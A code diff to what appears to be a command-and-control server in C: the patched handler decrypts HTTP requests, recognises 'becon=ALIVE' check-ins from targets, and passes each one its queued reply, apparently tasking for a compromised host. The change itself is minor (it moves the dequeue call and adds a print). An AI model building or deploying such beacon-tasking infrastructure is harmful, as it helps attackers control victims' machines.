@@ -293,14 +293,18 @@ DWORD WINAPI handle_http_connections(LPVOID arg) {
             if (strncmp((char*)decrypted, "GET /data=", 10) == 0) {
                 snprintf(buffer, sizeof(buffer), "%s\0", &buffer[10]);
             }
+            printf("Size - %d\n",bytes_receivedU64);
             printf("out:\n%s\n", buffer);
-
+            
+            char* reply;
             if (strncmp((char*)decrypted, "GET /becon=ALIVE:", 17) == 0) {
                 char *hex = bytes_to_hex(&decrypted[17], 8);
                 printf("TRAGET %s CONECTED\n", hex);
                 memset(buffer, 0, sizeof(buffer));
                 snprintf(buffer, sizeof(buffer), "TARGET:%s\0", hex);
                 free(hex);
+                reply = dequeue(buffer+7);
+                printf("%s",reply);
             }
 
             // Broadcast to all control clients
@@ -309,8 +313,7 @@ DWORD WINAPI handle_http_connections(LPVOID arg) {
             
             broadcast_to_clients(broadcast_msg, INVALID_SOCKET);
 
-            char* reply = dequeue(buffer+7);
-            printf("%s",reply);
+            
             
             char *response;
             int response_size;
